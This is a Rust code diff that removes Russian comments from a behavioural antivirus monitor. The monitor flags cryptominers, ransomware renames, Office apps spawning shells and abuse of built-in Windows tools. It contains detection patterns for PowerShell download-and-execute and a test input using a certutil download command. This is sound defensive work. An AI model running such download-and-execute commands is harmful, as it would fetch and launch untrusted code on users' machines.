@@ -1,14 +1,3 @@
-//! Поведенческая защита: фоновый монитор, который следит не за «что за файл», а за «что он делает».
-//!
-//! Сигналы (правила в `Evaluator`, не зависят от ОС и покрыты тестами):
-//!   • майнер: процесс без подписи держит заметную нагрузку на процессор минуты подряд, особенно с соединением на порт пула;
-//!   • запуск неподписанной программы из Temp/Загрузок/Public;
-//!   • приёмы вирусов: PowerShell скачивает и запускает код, загрузка и запуск из сети через certutil/bitsadmin/mshta/regsvr32;
-//!   • цепочки «Word/Excel/PDF → cmd/PowerShell/wscript»;
-//!   • новые записи автозапуска из временных папок или с приёмами из предыдущего пункта;
-//!   • шифровальщик: массовое переименование файлов в Документах/Рабочем столе/Изображениях, файлы с «выкупными» расширениями.
-//! Монитор только предупреждает (событие `bh-alert` + журнал); завершить процесс или добавить в доверенные решает пользователь.
-//! Работает в пользовательском режиме, пока запущена программа: драйвера ядра у нас нет, поэтому полной защиты Защитника не заменит.
 
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
@@ -23,29 +12,23 @@ use sysinfo::{ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};
 use tauri::{AppHandle, Emitter, Manager};
 
 const SAMPLE_SECS: u64 = 5;
-/// Окно усреднения нагрузки: 36 выборок × 5 с = 3 минуты.
 const CPU_WINDOW: usize = 36;
-const CPU_ALERT_PERCENT: f32 = 25.0; // от всего процессора
-const NET_EVERY: u64 = 3; // раз в 3 выборки (15 с)
-const AUTORUN_EVERY: u64 = 24; // раз в 2 минуты
+const CPU_ALERT_PERCENT: f32 = 25.0;
+const NET_EVERY: u64 = 3;
+const AUTORUN_EVERY: u64 = 24;
 const MAX_SIGCHECKS_PER_CYCLE: usize = 2;
-/// Одно и то же правило по одной и той же программе — не чаще раза в 10 минут. id тревоги содержит PID, а
-/// у каждого запуска он новый: без паузы скрипт, который запускает одну и ту же утилиту в цикле, давал тост на каждый вызов.
 const REPEAT_SECS: u64 = 600;
 
 static RUNNING: AtomicBool = AtomicBool::new(false);
 static STOP: AtomicBool = AtomicBool::new(false);
-/// Выставляется при смене настроек в интерфейсе: монитор перечитывает их на следующей же выборке, а не раз в минуту.
 static DIRTY: AtomicBool = AtomicBool::new(true);
 static ALERTS: Mutex<Vec<Alert>> = Mutex::new(Vec::new());
-
-// ------------------------------------------------------------------ модель
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
 pub struct Alert {
     pub id: String,
     pub at: u64,
-    pub severity: String, // critical | high | medium | low
+    pub severity: String,
     pub rule: String,
     pub title: String,
     pub detail: String,
@@ -54,7 +37,6 @@ pub struct Alert {
     pub path: Option<String>,
 }
 
-/// Снимок процесса, на который смотрят правила.
 #[derive(Clone, Debug, Default)]
 pub struct Sample {
     pub pid: u64,
@@ -62,7 +44,6 @@ pub struct Sample {
     pub exe: String,
     pub cmd: String,
     pub parent_name: String,
-    /// Нагрузка в процентах от ВСЕГО процессора (не от одного ядра).
     pub cpu_total: f32,
     pub is_new: bool,
     pub pool_conn: Option<String>,
@@ -73,14 +54,11 @@ struct Settings {
     #[serde(default = "yes")]
     enabled: bool,
     #[serde(default)]
-    trusted: Vec<String>, // пути и имена процессов, которым пользователь доверяет
-    /// Защита файлов в реальном времени: новые файлы в Загрузках, на Рабочем столе, в Temp и автозагрузке проверяются сразу.
+    trusted: Vec<String>,
     #[serde(default = "yes")]
     realtime: bool,
-    /// Найденный по базе вредоносный файл сразу уходит в карантин (иначе — только предупреждение).
     #[serde(default = "yes")]
     auto_quarantine: bool,
-    /// Правила, которые пользователь выключил (miner-cpu, ransomware, lolbin, …).
     #[serde(default)]
     disabled_rules: Vec<String>,
 }
@@ -105,12 +83,9 @@ fn stem(name: &str) -> String {
     l.strip_suffix(".exe").unwrap_or(&l).to_string()
 }
 
-// ----------------------------------------------------------------- правила
-
 const OFFICE: &[&str] = &["winword", "excel", "powerpnt", "outlook", "acrord32", "acrobat", "onenote", "msaccess"];
 const SHELLS: &[&str] = &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "rundll32", "regsvr32"];
 const SUSPICIOUS_DIRS: &[&str] = &["\\appdata\\local\\temp\\", "\\windows\\temp\\", "\\users\\public\\", "\\downloads\\", "\\appdata\\roaming\\"];
-/// Программы, которые законно грузят процессор и ходят на «пуловые» порты: для правила нагрузки их не трогаем.
 const HEAVY_OK: &[&str] = &[
     "system", "idle", "msmpeng", "mpdefendercoreservice", "searchindexer", "dwm", "explorer", "svchost", "audiodg", "wmiprvse",
     "chrome", "msedge", "firefox", "brave", "opera", "vivaldi", "steam", "steamwebhelper", "epicgameslauncher", "discord", "slack",
@@ -123,15 +98,12 @@ pub fn in_suspicious_dir(path: &str) -> bool {
     SUSPICIOUS_DIRS.iter().any(|d| l.contains(d))
 }
 
-/// Приёмы, по которым вирусы запускают код через штатные утилиты Windows.
 pub fn lolbin_abuse(name: &str, cmd: &str) -> Option<&'static str> {
     let n = stem(name);
     let c = cmd.to_lowercase();
     let has = |s: &str| c.contains(s);
     match n.as_str() {
         "powershell" | "pwsh" => {
-            // Голый -EncodedCommand не считаем признаком: так штатно запускают команды Claude Code, установщики и
-            // инструменты разработчика — правило давало только ложные тревоги. Загрузку и раскодирование ловят правила ниже.
             if (has("downloadstring") || has("downloadfile") || has("invoke-webrequest") || has("iwr ")) && (has("iex") || has("invoke-expression") || has("start-process")) {
                 Some("PowerShell скачивает и сразу запускает код из сети")
             } else if (has("-windowstyle hidden") || has("-w hidden") || has("-nop")) && (has("http") || has("frombase64string")) {
@@ -169,7 +141,6 @@ pub fn ransom_note(name: &str) -> bool {
         .any(|p| n.contains(p))
 }
 
-/// Группы защиты в интерфейсе → правила монитора.
 pub fn rules_of_group(group: &str) -> &'static [&'static str] {
     match group {
         "miner" => &["miner-cpu"],
@@ -194,14 +165,11 @@ fn alert(rule: &str, severity: &str, title: String, detail: String, s: &Sample) 
     }
 }
 
-/// Оценщик: хранит скользящую нагрузку по процессам и кэш подписей; сам ничего не запускает.
 #[derive(Default)]
 pub struct Evaluator {
     cpu: HashMap<u64, VecDeque<f32>>,
-    /// exe → подписан ли (true = подпись Windows подтверждена). Нет записи — ещё не проверяли.
     pub signed: HashMap<String, bool>,
     fired: HashSet<String>,
-    /// «правило:программа» → когда последний раз показали (см. REPEAT_SECS).
     last_shown: HashMap<String, u64>,
     pub trusted: HashSet<String>,
 }
@@ -226,7 +194,6 @@ impl Evaluator {
         }
     }
 
-    /// Какие процессы стоит проверить на подпись (нужна для решений ниже): сильно нагружающие или новые из подозрительных папок.
     pub fn needs_signature(&self, s: &Sample) -> bool {
         if s.exe.is_empty() || self.signed.contains_key(&lower(&s.exe)) || self.is_trusted(s) {
             return false;
@@ -249,20 +216,17 @@ impl Evaluator {
         let full_window = w.len() >= CPU_WINDOW;
         let signed = self.signed.get(&lower(&s.exe)).copied();
 
-        // 1. Приёмы вирусов через штатные утилиты.
         if let Some(why) = lolbin_abuse(&s.name, &s.cmd) {
             if let Some(a) = self.once(alert("lolbin", "high", format!("Подозрительный запуск: {}", s.name), why.into(), s)) {
                 out.push(a);
             }
         }
-        // 2. Документ запустил оболочку.
         if office_spawn(&s.parent_name, &s.name) {
             let a = alert("office-spawn", "high", format!("{} запущен из {}", s.name, s.parent_name), "Офисная программа или PDF-читалка не должна запускать командную оболочку — так работают вредоносные документы.".into(), s);
             if let Some(a) = self.once(a) {
                 out.push(a);
             }
         }
-        // 3. Неподписанная программа из временной папки/Загрузок.
         if s.is_new && in_suspicious_dir(&s.exe) && signed == Some(false) {
             let sev = if s.pool_conn.is_some() { "high" } else { "medium" };
             let a = alert("unsigned-temp", sev, format!("Неподписанная программа запущена из временной папки: {}", s.name), "Программа без цифровой подписи стартовала из папки, откуда обычно запускаются вирусы и загрузчики.".into(), s);
@@ -270,7 +234,6 @@ impl Evaluator {
                 out.push(a);
             }
         }
-        // 4. Майнер: постоянная нагрузка + нет подписи (подписанные программы — игры, редакторы — считаем нормой).
         let name_ok = HEAVY_OK.contains(&stem(&s.name).as_str());
         if full_window && avg_cpu >= CPU_ALERT_PERCENT && !name_ok && signed == Some(false) {
             let mut why = format!("Процесс без подписи держит нагрузку на процессор около {:.0}% уже 3 минуты.", avg_cpu);
@@ -291,7 +254,6 @@ impl Evaluator {
         out
     }
 
-    /// true, если такой сигнал ещё не поднимали (чтобы одно соединение не шумело каждые 15 секунд).
     pub fn fired_once(&mut self, id: &str) -> bool {
         self.fired.insert(id.to_string())
     }
@@ -309,12 +271,9 @@ fn avg(w: &VecDeque<f32>) -> f32 {
     }
 }
 
-// ----------------------------------------------------------- шифровальщик
-
-/// Считает изменения файлов в окне 10 с и решает, похоже ли это на шифровальщика.
 #[derive(Default)]
 pub struct RansomWatch {
-    window: VecDeque<(Instant, String, bool)>, // (когда, путь, было переименование в чужое расширение)
+    window: VecDeque<(Instant, String, bool)>,
 }
 
 impl RansomWatch {
@@ -338,8 +297,6 @@ impl RansomWatch {
         None
     }
 }
-
-// ----------------------------------------------------------- ОС-часть
 
 fn data_dir(app: &AppHandle) -> Option<PathBuf> {
     let d = app.path().app_data_dir().ok()?.join("av");
@@ -399,17 +356,13 @@ fn powershell(script: &str) -> Option<String> {
     }
 }
 
-/// Подписан ли файл действительной подписью Authenticode.
 fn is_signed(path: &str) -> bool {
     let p = crate::antivirus::ps_quote(path);
     powershell(&format!("(Get-AuthenticodeSignature -LiteralPath '{p}').Status"))
         .map(|s| s.trim() == "Valid")
-        .unwrap_or(true) // не смогли проверить — не обвиняем
+        .unwrap_or(true)
 }
 
-/// Установленные TCP-соединения одним вызовом netstat: (pid, «ip:порт» удалённой стороны).
-/// Раньше pool_connections и c2_connections запускали netstat каждая сама — два процесса и
-/// два разбора одного и того же вывода за тик.
 #[cfg(windows)]
 fn established_tcp() -> Vec<(u64, String)> {
     use std::os::windows::process::CommandExt;
@@ -434,7 +387,6 @@ fn established_tcp() -> Vec<(u64, String)> {
     Vec::new()
 }
 
-/// pid → «ip:порт» для соединений на порты майнинг-пулов.
 fn pool_connections(conns: &[(u64, String)]) -> HashMap<u64, String> {
     let ports: [&str; 7] = [":3333", ":4444", ":5555", ":7777", ":14433", ":14444", ":45560"];
     conns
@@ -444,7 +396,6 @@ fn pool_connections(conns: &[(u64, String)]) -> HashMap<u64, String> {
         .collect()
 }
 
-/// pid → «ip:порт» для соединений с адресами из списка управляющих серверов.
 fn c2_connections(conns: &[(u64, String)], bad: &HashSet<String>) -> HashMap<u64, String> {
     if bad.is_empty() {
         return HashMap::new();
@@ -475,7 +426,6 @@ fn monitor(app: AppHandle) {
     let mut settings = load_settings(&app);
     let mut ev = Evaluator::default();
     ev.trusted = settings.trusted.iter().map(|t| lower(t)).collect();
-    // sysinfo 0.40: System::new() может не инициализироваться — без списка процессов монитор бесполезен.
     let mut sys = match System::new() {
         Ok(s) => s,
         Err(e) => {
@@ -494,7 +444,6 @@ fn monitor(app: AppHandle) {
     let mut autorun = autorun_snapshot();
     let own_pid = std::process::id() as u64;
 
-    // Файловый наблюдатель за пользовательскими папками (шифровальщик).
     let (tx, rx) = std::sync::mpsc::channel::<notify::Result<notify::Event>>();
     let mut watcher = notify::recommended_watcher(tx).ok();
     if let Some(w) = watcher.as_mut() {
@@ -508,7 +457,6 @@ fn monitor(app: AppHandle) {
             }
         }
     }
-    // Защита в реальном времени: новые исполняемые файлы там, куда обычно попадает чужое.
     let (rt_tx, rt_rx) = std::sync::mpsc::channel::<notify::Result<notify::Event>>();
     let mut rt_watcher = notify::recommended_watcher(rt_tx).ok();
     if let Some(w) = rt_watcher.as_mut() {
@@ -533,7 +481,7 @@ fn monitor(app: AppHandle) {
         }
     }
     let mut checker = crate::antivirus::Checker::new(&app);
-    let mut pending: HashMap<String, (Instant, u64)> = HashMap::new(); // путь → (когда впервые увидели, размер)
+    let mut pending: HashMap<String, (Instant, u64)> = HashMap::new();
     let mut ransom = RansomWatch::default();
     let mut last_ransom_alert = Instant::now() - Duration::from_secs(600);
 
@@ -555,7 +503,7 @@ fn monitor(app: AppHandle) {
             c2 = c2_connections(&conns, &bad_ips);
         }
         if tick % 240 == 0 {
-            bad_ips = crate::antivirus::bad_ip_set(&app); // базы могли обновиться
+            bad_ips = crate::antivirus::bad_ip_set(&app);
         }
 
         let mut alive = HashSet::new();
@@ -613,7 +561,6 @@ fn monitor(app: AppHandle) {
         ev.forget(&alive);
         seen.retain(|p| alive.contains(p));
 
-        // Новые записи автозапуска и планировщика.
         if settings.enabled && tick % AUTORUN_EVERY == 0 {
             let fresh = autorun_snapshot();
             for entry in fresh.difference(&autorun) {
@@ -641,7 +588,6 @@ fn monitor(app: AppHandle) {
             autorun = fresh;
         }
 
-        // Файловая активность.
         while let Ok(Ok(event)) = rx.try_recv() {
             use notify::event::{EventKind, ModifyKind, RenameMode};
             let renamed = matches!(event.kind, EventKind::Modify(ModifyKind::Name(RenameMode::Both | RenameMode::To)));
@@ -669,7 +615,6 @@ fn monitor(app: AppHandle) {
             }
         }
 
-        // Защита файлов в реальном времени: собираем новые файлы, через 2 с (когда запись закончилась) проверяем по базе.
         while let Ok(Ok(event)) = rt_rx.try_recv() {
             if matches!(event.kind, notify::EventKind::Create(_) | notify::EventKind::Modify(_)) {
                 for path in &event.paths {
@@ -734,7 +679,6 @@ fn monitor(app: AppHandle) {
     RUNNING.store(false, Ordering::Relaxed);
 }
 
-/// Запуск монитора, если он включён в настройках (вызывается при старте приложения).
 pub fn start_if_enabled(app: AppHandle) {
     load_alerts(&app);
     if load_settings(&app).enabled {
@@ -750,8 +694,6 @@ fn start(app: AppHandle) {
     std::thread::spawn(move || monitor(app));
 }
 
-// ------------------------------------------------------------------ команды
-
 #[tauri::command]
 pub fn bh_status(app: AppHandle) -> Value {
     let s = load_settings(&app);
@@ -763,7 +705,6 @@ pub fn bh_status(app: AppHandle) -> Value {
     })
 }
 
-/// Переключатели защиты в интерфейсе: realtime, auto_quarantine, miner, ransomware, scripts.
 #[tauri::command]
 pub fn bh_set(app: AppHandle, key: String, value: bool) {
     let mut s = load_settings(&app);
@@ -782,7 +723,6 @@ pub fn bh_set(app: AppHandle, key: String, value: bool) {
     }
     save_settings(&app, &s);
     DIRTY.store(true, Ordering::Relaxed);
-    // Монитор подхватывает настройки сразу; для включённой защиты запускаем, если он остановлен.
     if (s.realtime || s.enabled) && !RUNNING.load(Ordering::Relaxed) {
         start(app);
     }
@@ -819,7 +759,6 @@ pub fn bh_dismiss(app: AppHandle, id: Option<String>) {
     }
 }
 
-/// Доверять программе: её больше не разбирают правила (по пути и по имени процесса).
 #[tauri::command]
 pub fn bh_trust(app: AppHandle, path: Option<String>, name: Option<String>) {
     let mut s = load_settings(&app);
@@ -867,13 +806,12 @@ mod tests {
             ev.evaluate(&x)
         };
         assert_eq!(run(1).len(), 1);
-        // каждый вызов — новый PID, но это та же программа и то же правило: второй тост не нужен
         for pid in 2..30 {
             assert!(run(pid).is_empty());
         }
         let mut cert = s("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil -urlcache -f http://x/a.exe a.exe", "cmd.exe", 1.0);
         cert.pid = 31;
-        assert_eq!(ev.evaluate(&cert).len(), 1); // другая программа — свой тост
+        assert_eq!(ev.evaluate(&cert).len(), 1);
     }
 
     #[test]
@@ -890,15 +828,14 @@ mod tests {
         let exe = "C:\\Users\\a\\AppData\\Roaming\\svc\\svchost32.exe";
         ev.signed.insert(lower(exe), false);
         let sample = s("svchost32.exe", exe, "", "explorer.exe", 40.0);
-        // меньше окна — молчим
         for _ in 0..CPU_WINDOW - 1 {
             assert!(ev.evaluate(&sample).is_empty());
         }
         let alerts = ev.evaluate(&sample);
         assert_eq!(alerts.len(), 1);
         assert_eq!(alerts[0].rule, "miner-cpu");
-        assert_eq!(alerts[0].severity, "high"); // из AppData
-        assert!(ev.evaluate(&sample).is_empty()); // повторно не шумим
+        assert_eq!(alerts[0].severity, "high");
+        assert!(ev.evaluate(&sample).is_empty());
     }
 
     #[test]
@@ -961,7 +898,6 @@ mod tests {
             fired = w2.push(&format!("C:\\Users\\a\\Documents\\f{i}.xyz"), true, t);
         }
         assert_eq!(fired.unwrap().0, "high");
-        // обычное копирование (без переименований) не считается
         let mut w3 = RansomWatch::default();
         for i in 0..300 {
             assert!(w3.push(&format!("C:\\Users\\a\\Documents\\c{i}.docx"), false, t).is_none());
